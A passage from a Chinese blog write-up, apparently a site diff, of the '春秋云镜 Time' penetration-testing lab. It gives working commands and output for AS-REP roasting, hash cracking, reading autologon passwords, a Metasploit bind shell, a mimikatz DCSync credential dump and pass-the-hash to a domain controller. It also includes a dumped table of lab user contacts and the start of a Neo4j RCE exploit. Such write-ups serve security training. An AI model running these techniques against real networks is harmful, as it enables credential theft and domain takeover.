XIN |\r| 347 | luxing@xiaorang.lab | 18318675030 | LU XING |\r| 348 | huayan@xiaorang.lab | 13011805354 | HUA YAN |\r| 349 | duyue@xiaorang.lab | 15515878208 | DU YUE |\r| 350 | xijun@xiaorang.lab | 17871583183 | XI JUN |\r| 351 | daiqing@xiaorang.lab | 18033226216 | DAI QING |\r| 352 | yingbiao@xiaorang.lab | 18633421863 | YING BIAO |\r| 353 | hengteng@xiaorang.lab | 15956780740 | HENG TENG |\r| 354 | changwu@xiaorang.lab | 15251485251 | CHANG WU |\r| 355 | chengying@xiaorang.lab | 18788248715 | CHENG YING |\r| 356 | luhong@xiaorang.lab | 17766091079 | LU HONG |\r| 357 | tongxue@xiaorang.lab | 18466102780 | TONG XUE |\r| 358 | xiangqian@xiaorang.lab | 13279611385 | XIANG QIAN |\r| 359 | shaokang@xiaorang.lab | 18042645434 | SHAO KANG |\r| 360 | nongzhu@xiaorang.lab | 13934236634 | NONG ZHU |\r| 361 | haomei@xiaorang.lab | 13406913218 | HAO MEI |\r| 362 | maoqing@xiaorang.lab | 15713298425 | MAO QING |\r| 363 | xiai@xiaorang.lab | 18148404789 | XI AI |\r| 364 | bihe@xiaorang.lab | 13628593791 | BI HE |\r| 365 | gaoli@xiaorang.lab | 15814408188 | GAO LI |\r| 366 | jianggong@xiaorang.lab | 15951118926 | JIANG GONG |\r| 367 | pangning@xiaorang.lab | 13443921700 | PANG NING |\r| 368 | ruishi@xiaorang.lab | 15803112819 | RUI SHI |\r| 369 | wuhuan@xiaorang.lab | 13646953078 | WU HUAN |\r| 370 | qiaode@xiaorang.lab | 13543564200 | QIAO DE |\r| 371 | mayong@xiaorang.lab | 15622971484 | MA YONG |\r| 372 | hangda@xiaorang.lab | 15937701659 | HANG DA |\r| 373 | changlu@xiaorang.lab | 13734991654 | CHANG LU |\r| 374 | liuyuan@xiaorang.lab | 15862054540 | LIU YUAN |\r| 375 | chenggu@xiaorang.lab | 15706685526 | CHENG GU |\r| 376 | shentuyun@xiaorang.lab | 15816902379 | SHEN TU YUN |\r| 377 | zhuangsong@xiaorang.lab | 17810274262 | ZHUANG SONG |\r| 378 | chushao@xiaorang.lab | 18822001640 | CHU SHAO |\r| 379 | heli@xiaorang.lab | 13701347081 | HE LI |\r| 380 | haoming@xiaorang.lab | 15049615282 | HAO MING |\r| 381 | xieyi@xiaorang.lab | 17840660107 | XIE YI |\r| 382 | shangjie@xiaorang.lab | 15025010410 | SHANG JIE |\r| 383 | situxin@xiaorang.lab | 18999728941 | SI TU XIN |\r| 384 | linxi@xiaorang.lab | 18052976097 | LIN XI |\r| 385 | zoufu@xiaorang.lab | 15264535633 | ZOU FU |\r| 386 | qianqing@xiaorang.lab | 18668594658 | QIAN QING |\r| 387 | qiai@xiaorang.lab | 18154690198 | QI AI |\r| 388 | ruilin@xiaorang.lab | 13654483014 | RUI LIN |\r| 389 | luomeng@xiaorang.lab | 15867095032 | LUO MENG |\r| 390 | huaren@xiaorang.lab | 13307653720 | HUA REN |\r| 391 | yanyangmei@xiaorang.lab | 15514015453 | YAN YANG MEI |\r| 392 | zuofen@xiaorang.lab | 15937087078 | ZUO FEN |\r| 393 | manyuan@xiaorang.lab | 18316106061 | MAN YUAN |\r| 394 | yuhui@xiaorang.lab | 18058257228 | YU HUI |\r| 395 | sunli@xiaorang.lab | 18233801124 | SUN LI |\r| 396 | guansixin@xiaorang.lab | 13607387740 | GUAN SI XIN |\r| 397 | ruisong@xiaorang.lab | 13306021674 | RUI SONG |\r| 398 | qiruo@xiaorang.lab | 13257810331 | QI RUO |\r| 399 | jinyu@xiaorang.lab | 18565922652 | JIN YU |\r| 400 | shoujuan@xiaorang.lab | 18512174415 | SHOU JUAN |\r| 401 | yanqian@xiaorang.lab | 13799789435 | YAN QIAN |\r| 402 | changyun@xiaorang.lab | 18925015029 | CHANG YUN |\r| 403 | hualu@xiaorang.lab | 13641470801 | HUA LU |\r| 404 | huanming@xiaorang.lab | 15903282860 | HUAN MING |\r| 405 | baoshao@xiaorang.lab | 13795275611 | BAO SHAO |\r| 406 | hongmei@xiaorang.lab | 13243605925 | HONG MEI |\r| 407 | manyun@xiaorang.lab | 13238107359 | MAN YUN |\r| 408 | changwan@xiaorang.lab | 13642205622 | CHANG WAN |\r| 409 | wangyan@xiaorang.lab | 13242486231 | WANG YAN |\r| 410 | shijian@xiaorang.lab | 15515077573 | SHI JIAN |\r| 411 | ruibei@xiaorang.lab | 18157706586 | RUI BEI |\r| 412 | jingshao@xiaorang.lab | 18858376544 | JING SHAO |\r| 413 | jinzhi@xiaorang.lab | 18902437082 | JIN ZHI |\r| 414 | yuhui@xiaorang.lab | 15215599294 | YU HUI |\r| 415 | zangpeng@xiaorang.lab | 18567574150 | ZANG PENG |\r| 416 | changyun@xiaorang.lab | 15804640736 | CHANG YUN |\r| 417 | yetai@xiaorang.lab | 13400150018 | YE TAI |\r| 418 | luoxue@xiaorang.lab | 18962643265 | LUO XUE |\r| 419 | moqian@xiaorang.lab | 18042706956 | MO QIAN |\r| 420 | xupeng@xiaorang.lab | 15881934759 | XU PENG |\r| 421 | ruanyong@xiaorang.lab | 15049703903 | RUAN YONG |\r| 422 | guliangxian@xiaorang.lab | 18674282714 | GU LIANG XIAN |\r| 423 | yinbin@xiaorang.lab | 15734030492 | YIN BIN |\r| 424 | huarui@xiaorang.lab | 17699257041 | HUA RUI |\r| 425 | niuya@xiaorang.lab | 13915041589 | NIU YA |\r| 426 | guwei@xiaorang.lab | 13584571917 | GU WEI |\r| 427 | qinguan@xiaorang.lab | 18427953434 | QIN GUAN |\r| 428 | yangdanhan@xiaorang.lab | 15215900100 | YANG DAN HAN |\r| 429 | yingjun@xiaorang.lab | 13383367818 | YING JUN |\r| 430 | weiwan@xiaorang.lab | 13132069353 | WEI WAN |\r| 431 | sunduangu@xiaorang.lab | 15737981701 | SUN DUAN GU |\r| 432 | sisiwu@xiaorang.lab | 18021600640 | SI SI WU |\r| 433 | nongyan@xiaorang.lab | 13312613990 | NONG YAN |\r| 434 | xuanlu@xiaorang.lab | 13005748230 | XUAN LU |\r| 435 | yunzhong@xiaorang.lab | 15326746780 | YUN ZHONG |\r| 436 | gengfei@xiaorang.lab | 13905027813 | GENG FEI |\r| 437 | zizhuansong@xiaorang.lab | 13159301262 | ZI ZHUAN SONG |\r| 438 | ganbailong@xiaorang.lab | 18353612904 | GAN BAI LONG |\r| 439 | shenjiao@xiaorang.lab | 15164719751 | SHEN JIAO |\r| 440 | zangyao@xiaorang.lab | 18707028470 | ZANG YAO |\r| 441 | yangdanhe@xiaorang.lab | 18684281105 | YANG DAN HE |\r| 442 | chengliang@xiaorang.lab | 13314617161 | CHENG LIANG |\r| 443 | xudi@xiaorang.lab | 18498838233 | XU DI |\r| 444 | wulun@xiaorang.lab | 18350490780 | WU LUN |\r| 445 | yuling@xiaorang.lab | 18835870616 | YU LING |\r| 446 | taoya@xiaorang.lab | 18494928860 | TAO YA |\r| 447 | jinle@xiaorang.lab | 15329208123 | JIN LE |\r| 448 | youchao@xiaorang.lab | 13332964189 | YOU CHAO |\r| 449 | liangduanzhi@xiaorang.lab | 15675237494 | LIANG DUAN ZHI |\r| 450 | jiagupiao@xiaorang.lab | 17884962455 | JIA GU PIAO |\r| 451 | ganze@xiaorang.lab | 17753508925 | GAN ZE |\r| 452 | jiangqing@xiaorang.lab | 15802357200 | JIANG QING |\r| 453 | jinshan@xiaorang.lab | 13831466303 | JIN SHAN |\r| 454 | zhengpubei@xiaorang.lab | 13690156563 | ZHENG PU BEI |\r| 455 | cuicheng@xiaorang.lab | 17641589842 | CUI CHENG |\r| 456 | qiyong@xiaorang.lab | 13485427829 | QI YONG |\r| 457 | qizhu@xiaorang.lab | 18838859844 | QI ZHU |\r| 458 | ganjian@xiaorang.lab | 18092585003 | GAN JIAN |\r| 459 | yurui@xiaorang.lab | 15764121637 | YU RUI |\r| 460 | feishu@xiaorang.lab | 18471512248 | FEI SHU |\r| 461 | chenxin@xiaorang.lab | 13906545512 | CHEN XIN |\r| 462 | shengzhe@xiaorang.lab | 18936457394 | SHENG ZHE |\r| 463 | wohong@xiaorang.lab | 18404022650 | WO HONG |\r| 464 | manzhi@xiaorang.lab | 15973350408 | MAN ZHI |\r| 465 | xiangdong@xiaorang.lab | 13233908989 | XIANG DONG |\r| 466 | weihui@xiaorang.lab | 15035834945 | WEI HUI |\r| 467 | xingquan@xiaorang.lab | 18304752969 | XING QUAN |\r| 468 | miaoshu@xiaorang.lab | 15121570939 | MIAO SHU |\r| 469 | gongwan@xiaorang.lab | 18233990398 | GONG WAN |\r| 470 | qijie@xiaorang.lab | 15631483536 | QI JIE |\r| 471 | shaoting@xiaorang.lab | 15971628914 | SHAO TING |\r| 472 | xiqi@xiaorang.lab | 18938747522 | XI QI |\r| 473 | jinghong@xiaorang.lab | 18168293686 | JING HONG |\r| 474 | qianyou@xiaorang.lab | 18841322688 | QIAN YOU |\r| 475 | chuhua@xiaorang.lab | 15819380754 | CHU HUA |\r| 476 | yanyue@xiaorang.lab | 18702474361 | YAN YUE |\r| 477 | huangjia@xiaorang.lab | 13006878166 | HUANG JIA |\r| 478 | zhouchun@xiaorang.lab | 13545820679 | ZHOU CHUN |\r| 479 | jiyu@xiaorang.lab | 18650881187 | JI YU |\r| 480 | wendong@xiaorang.lab | 17815264093 | WEN DONG |\r| 481 | heyuan@xiaorang.lab | 18710821773 | HE YUAN |\r| 482 | mazhen@xiaorang.lab | 18698248638 | MA ZHEN |\r| 483 | shouchun@xiaorang.lab | 15241369178 | SHOU CHUN |\r| 484 | liuzhe@xiaorang.lab | 18530936084 | LIU ZHE |\r| 485 | fengbo@xiaorang.lab | 15812110254 | FENG BO |\r| 486 | taigongyuan@xiaorang.lab | 15943349034 | TAI GONG YUAN |\r| 487 | gesheng@xiaorang.lab | 18278508909 | GE SHENG |\r| 488 | songming@xiaorang.lab | 13220512663 | SONG MING |\r| 489 | yuwan@xiaorang.lab | 15505678035 | YU WAN |\r| 490 | diaowei@xiaorang.lab | 13052582975 | DIAO WEI |\r| 491 | youyi@xiaorang.lab | 18036808394 | YOU YI |\r| 492 | rongxianyu@xiaorang.lab | 18839918955 | RONG XIAN YU |\r| 493 | fuyi@xiaorang.lab | 15632151678 | FU YI |\r| 494 | linli@xiaorang.lab | 17883399275 | LIN LI |\r| 495 | weixue@xiaorang.lab | 18672465853 | WEI XUE |\r| 496 | hejuan@xiaorang.lab | 13256081102 | HE JUAN |\r| 497 | zuoqiutai@xiaorang.lab | 18093001354 | ZUO QIU TAI |\r| 498 | siyi@xiaorang.lab | 17873307773 | SI YI |\r| 499 | shenshan@xiaorang.lab | 18397560369 | SHEN SHAN |\r| 500 | tongdong@xiaorang.lab | 15177549595 | TONG DONG |\r+-----+----------------------------+-------------+-----------------+ oa管理员账户密码\n[1 entry]\r+----+------------------+---------------+\r| id | password | username |\r+----+------------------+---------------+\r| 1 | bo2y8kAL3HnXUiQo | administrator |\r+----+------------------+---------------+ FLAG3\u0026FLAG4 AS-REPRoasting 拿到这堆user信息我们大概可以猜到要打AS-REPRoasting了\n先把这堆用户整理成一个用户字典user.txt\n我们可以通过impacket-GetNPUsers工具进行枚举，收集配置了“不需要预身份验证”的用户\nproxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ 可以拿到两个用户的TGT票据\n$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c\r$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1 用hashcat爆破出明文密码，用的kali自带的rockyou字典\nhashcat -m 18200 --force -a 0 '$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c' ./rockyou.txt\rhashcat -m 18200 --force -a 0 '$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1' ./rockyou.txt wenshao@xiaorang.lab/hellokitty\rzhangxin@xiaorang.lab/strawberry 尝试rdp到172.22.6.12\n发现没授权远程登录\n但是另一台机子172.22.6.25是可以登上的，但是拿不到flag\n我们先信息收集一手\n传一个SharpHound\nSharpHound.exe -c all Find Shortest Paths to Domain Admins\n可以看到yuxuan这个用户有SIDHistory，也就是说相当于是域管\n所有我们下一个目标就是要拿下yuxuan这个用户\n而且yuxuan这个用户在172.22.6.25上拥有会话。（HasSession）\n用户与计算机时进行会话时，凭据会保留在内存中。说明用户登陆过该主机。\nHasSession 方法一 直接查注册表，可以看到yuxuan这个账户设置了自动登录，而且能拿到明文密码\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon。若该路径下存在 AutoAdminLogon 键值且其数据数值为 1，同时 DefaultDomainName DefaultUserName DefaultPassword 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。\nyuxuan/Yuxuan7QbrgZ3L 方法二 小豌豆信息收集一手就能抓到\n方法三 用户设置了自动登录可以用msf抓取自动登录的账户密码\nmsf生成一个正向代理的shell，在靶机上运行\nmsfvenom -p windows/meterpreter/bind_tcp -f exe -o 1.exe 接着用msf连上去\nuse exploit/multi/handler\rset payload windows/meterpreter/bind_tcp\rset rhost 172.22.6.25\rrun 抓自动登录的账号密码\nmeterpreter \u003e run windows/gather/credentials/windows_autologin HasSIDHistory SID History是在域迁移过程中需要使用的一个属性。\n如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。\nSID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源\n域权限维持-SID History - xiaoxiaosen - 博客园\n拿到明文密码我们直接rdp上去\n因为有SID History这个用户可以访问域管的资源，所以我们可以直接拿mimikatz去dump域管的hash\nlsadump::dcsync /domain:xiaorang.lab /all /csv 拿到域管的hash\n500 Administrator 04d93ffd6f5f6e4490e0de23f240a5e9 512 接下来我们就可以PTH拿flag了\nproxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.12 C:\\Windows\\system32\u003e type c:\\Users\\Administrator\\flag\\flag04.txt\rAwesome! you got the final flag.\r:::::::::::::::::::::::::: :::: ::::::::::\r:+: :+: +:+:+: :+:+:+:+:\r+:+ +:+ +:+ +:+:+ +:++:+\r+#+ +#+ +#+ +:+ +#++#++:++#\r+#+ +#+ +#+ +#++#+\r#+# #+# #+# #+##+#\r### ############## #############\rflag04: flag{26180e6b-5b97-47ca-a861-a160ef12166c} proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.25 C:\\Windows\\system32\u003e type c:\\Users\\Administrator\\flag\\flag03.txt\rflag03: flag{ff39758a-623e-4f1f-b0bb-bb5f6d31ca83}\rMaybe you can find something interesting on this server.\r=======================================\rWhat you may not know is that many objects in this domain\rare moved from other domains. ",
+  "wordCount" : "6527",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-04-08T11:02:55+08:00",
+  "dateModified": "2025-04-08T11:02:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      春秋云镜-Time-Writeup
+    </h1>
+<div class="post-meta"><span title='2025-04-08 11:02:55 +0800 CST'>2025-04-08</span>&nbsp;·&nbsp;14 分钟&nbsp;·&nbsp;Xrntkk
+
+<div class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
+  </div>      
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
+                <li>
+                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
+                <li>
+                    <a href="#flag3flag4" aria-label="FLAG3&amp;FLAG4">FLAG3&amp;FLAG4</a><ul>
+                        
+                <li>
+                    <a href="#as-reproasting" aria-label="AS-REPRoasting">AS-REPRoasting</a></li>
+                <li>
+                    <a href="#hassession" aria-label="HasSession">HasSession</a><ul>
+                        
+                <li>
+                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="方法一">方法一</a></li>
+                <li>
+                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="方法二">方法二</a></li>
+                <li>
+                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%89" aria-label="方法三">方法三</a></li></ul>
+                </li>
+                <li>
+                    <a href="#hassidhistory" aria-label="HasSIDHistory">HasSIDHistory</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><em>靶标介绍：</em></p>
+<p>Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+<h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
+<p><img alt="image-20250408111403389" loading="lazy" src="../assets/image-20250408111403389.png"></p>
+<p>fscan扫一下</p>
+<p>看到7474，neo4j网页端的默认端口</p>
+<p><img alt="image-20250408111528824" loading="lazy" src="../assets/image-20250408111528824.png"></p>
+<p>登陆默认密码为neo4j/neo4j，登入后可以修改密码</p>
+<p><img alt="image-20250408111619411" loading="lazy" src="../assets/image-20250408111619411.png"></p>
+<p>修改为neo4j/abc123456</p>
+<p><img alt="image-20250408111947616" loading="lazy" src="../assets/image-20250408111947616.png"></p>
+<p>数据版本为3.4.18，打 CVE-2021-34371</p>
+<p><a href="https://www.exploit-db.com/exploits/50170">Neo4j 3.4.18 - RMI based Remote Code Execution (RCE) - Java remote Exploit</a></p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Neo4j</span><span class="w"> </span><span class="n">3</span><span class="p">.</span><span class="na">4</span><span class="p">.</span><span class="na">18</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">RMI</span><span class="w"> </span><span class="n">based</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="nf">Execution</span><span class="w"> </span><span class="p">(</span><span class="n">RCE</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="n">7</span><span class="o">/</span><span class="n">30</span><span class="o">/</span><span class="n">21</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Christopher</span><span class="w"> </span><span class="n">Ellis</span><span class="p">,</span><span class="w"> </span><span class="n">Nick</span><span class="w"> </span><span class="n">Gonella</span><span class="p">,</span><span class="w"> </span><span class="n">Workday</span><span class="w"> </span><span class="n">Inc</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Vendor</span><span class="w"> </span><span class="n">Homepage</span><span class="p">:</span><span class="w"> </span><span class="n">neo4j</span><span class="p">.</span><span class="na">com</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Software</span><span class="w"> </span><span class="n">Link</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//neo4j.com/download-thanks/?edition=community&amp;release=3.4.18&amp;flavour=unix</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="n">3</span><span class="p">.</span><span class="na">4</span><span class="p">.</span><span class="na">18</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Tested</span><span class="w"> </span><span class="n">on</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">,</span><span class="w"> </span><span class="n">Mac</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w"></span><span class="n">In</span><span class="w"> </span><span class="n">older</span><span class="w"> </span><span class="n">versions</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">Neo4j</span><span class="p">,</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">enabled</span><span class="p">,</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">obtained</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Java</span><span class="w"> </span><span class="n">deserialization</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="w"> </span><span class="n">In</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ShellServer</span><span class="w"> </span><span class="kd">interface</span><span class="err">,</span> <span class="nc">a</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="nf">setSessionVariable</span><span class="p">(</span><span class="n">Serializable</span><span class="w"> </span><span class="n">paramSerializable</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">paramString</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">paramObject</span><span class="p">)</span><span class="w"> </span><span class="n">exists</span><span class="p">.</span><span class="w"> </span><span class="n">Neo4j</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nf">dependency</span><span class="w"> </span><span class="p">(</span><span class="n">rhino</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">7</span><span class="p">.</span><span class="na">9</span><span class="p">)</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="n">chains</span><span class="p">.</span><span class="w"> </span><span class="n">By</span><span class="w"> </span><span class="n">crafting</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">abuse</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="n">chains</span><span class="p">,</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">obtain</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">server</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">
